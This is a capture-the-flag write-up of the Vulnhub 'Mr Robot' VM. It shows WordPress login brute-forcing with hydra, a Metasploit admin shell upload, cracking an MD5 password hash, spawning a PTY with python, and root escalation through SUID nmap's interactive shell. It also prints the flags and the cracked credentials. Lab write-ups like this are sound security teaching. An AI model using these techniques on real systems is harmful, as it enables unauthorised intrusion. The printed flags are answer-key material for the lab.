Welcome to another [Vulnhub](https://www.vulnhub.com/entry/mr-robot-1,151/) writeup. This time we'll work with Mr Robot:
>Based on the show, Mr. Robot.
This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find.
The VM isn't too difficult. There isn't any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.


## Recon
Without further addo let's go with some standard recon things:

```bash
# nmap 192.168.0.105 -p- -sT -sV -O

Starting Nmap 7.50 ( https://nmap.org ) at 2017-09-11 12:16 EDT

```

So, there seems to be some HTTP server up. Browsing didn't give up much. It just looks like some 'Mr. Robot' meta-commercial. So i decide to do more insightful HTTP scan:

```bash
# nikto -host 192.168.0.105

## Flag 1
So, there seems to be some wordpress intalation working. We'll get right to that just after we check out the robots.txt file:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Bingo! Opening key-1-of-3.txt file give us the first flag:
```
073403c8a58a1f80d943455fb30724b9
```
## Flag 2
Another interesting file revealed by robots.txt file is named fsocity.dic and it seems to be kind of dictionary. Unfortunatetly it's full of double entries, so we need to clean it up:
```bash
# wget http://192.168.0.105/fsocity.dic
# sort fsocity.dic | uniq > fsocity.uniq.dic
# wc -l fsocity.dic 
858160 fsocity.dic
# wc -l fsocity.uniq.dic 
11451 fsocity.uniq.dic
```
Filtered dictionary is roughly only 1% of original file. That should radically shorten amount of time needed for enumeration.

But what to enumerate? Let's give a go a standard wp-login form. Worpress login page is kind enough to tell us if we got the username right, so we can split the enumeration in two stages to further decrease number of combinations. First we go with login enumeration with any, constant password:

```bash
# hydra -L fsocity.uniq.dic -p dupa 192.168.0.105 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.0.105%2Fwp-admin%2F&testcookie=1:Invalid username"Hydra

[80][http-post-form] host: 192.168.0.105   login: elliot   password: dupa
[80][http-post-form] host: 192.168.0.105   login: Elliot   password: dupa
[80][http-post-form] host: 192.168.0.105   login: ELLIOT   password: dupa
[STATUS] 454.85 tries/min, 9097 tries in 00:20h, 2355 to do in 00:06h, 16 active
1 of 1 target successfully completed, 3 valid passwords found
```
Now, that we know the login, we can hardcode it and enumerate the password:

```bash
hydra -l elliot -P fsocity.uniq.dic 192.168.0.102 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.0.102%2Fwp-admin%2F&testcookie=1:incorrect"

[STATUS] 709.00 tries/min, 709 tries in 00:01h, 10743 to do in 00:16h, 16 active
[STATUS] 705.00 tries/min, 2115 tries in 00:03h, 9337 to do in 00:14h, 16 active
[STATUS] 702.29 tries/min, 4916 tries in 00:07h, 6536 to do in 00:10h, 16 active
[80][http-post-form] host: 192.168.0.105   login: elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
```
As we can see the credentials to wordpress installation are the following:

```
elliot:ER28-0652
```

Having admin rights on Wordpress gives us plenty of possibilities to escalate the attack. I'm feeling kinda lazy so I decide to use preprepared solution from Metasploit:

```bash
msfconsole -q
msf > use exploit/unix/webapp/wp_admin_shell_upload
msf exploit(wp_admin_shell_upload) > info

Payload information:

Description:
  This module will generate a plugin, pack the payload into it and 
  upload it to a server running WordPress providing valid admin 
  credentials are used.
```
Unfortunately my first attempts to attack ended in error:

```
'The target does not appear to be using WordPress'
```

Just because I *know* target uses WordPress, I decide to comment out the line throwing the exception from the exploit:

```ruby
fail_with(Failure::NotFound, 'The target does not appear to be using WordPress') unless wordpress_and_online?
```

Surprisingly enough this worked. I'm not sure if it was some script-kiddie precaution or the WordPress installation was not standard.

Above tweak wasn't enough though. The exploit did authenticate in WordPress but failed to upload a payload with error:

```
Unexpected reply error : Failed to upload the payload.
```

I look up the place in code where the exception is thrown:

```ruby
res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => wordpress_url_admin_update,
      'ctype'     => "multipart/form-data; boundary=#{data.bound}",
      'data'      => data.to_s,
      'cookie'    => cookie,
      'vars_get'  => { 'action' => 'upload-plugin' }
    )

    if res && res.code == 200
      vprint_status("Uploaded plugin #{name}")
      return true
    else
      vprint_error("Server responded with code #{res.code}") if res
      vprint_error("Failed to upload plugin #{name}")
      return false
    end
```
According to code where the exception is thrown, the exploit should also print out the status code, but it doesn't... unless there isn't any reply at all. Timeout? Let's check out:

```bash
msf exploit(wp_admin_shell_upload) > set HttpClientTimeout 300
msf exploit(wp_admin_shell_upload) > exploit

```
Bingo! Let's poke around in shell:
```bash
shell
cat /etc/passwd

cat: /etc/shadow: Permission denied
```
No surprises here. We could list users but not passwords. That'd be too easy. But what is in home dir?

```bash
cd /home
ls
robot
cd robot
ls -al
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```
So we've found a file with a flag but it can be read only by a 'robot' user. That shouldn't be a problem since we were also given a readable file with (hashed) robot password:

```bash
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```
Using any online rainbow table we find out that credentials are:

```
robot:abcdefghijklmnopqrstuvwxyz
```

Now we need to spawn a shell with TTY to be able to su the 'robot' user:
```bash
/bin/sh -i
/bin/sh: 0: can't access tty; job control turned off
```
Simple solution didn't work, how about more sophisticated?
```bash

python -c 'import pty; pty.spawn("/bin/sh")'
$ su - robot
Password: abcdefghijklmnopqrstuvwxyz
$ whoami
robot
$ cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

## Flag 3

Now it is time to get root. How can we do that? For starters lets try to find out application with SUID and owned by root:
```bash
$ find / -user root -perm -4000 2> /dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```
As we can see there's nmap application. We can use it spawn shell with root privileges:
```bash
$ /usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
whoami
root
```

Yay! We have root. Last thing to do: find a flag. Since we could establish a pattern how the flag files are named let's just try to find it:
```bash
$ find / -name key-3-of-3.txt
/root/key-3-of-3.txt
$ cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

## Summary
That's all folks! We have all three keys and root on victim machine. I hope you enjoyed this writeup. If you have any questions shoot me in the comment section, I'll try my best to answer :)
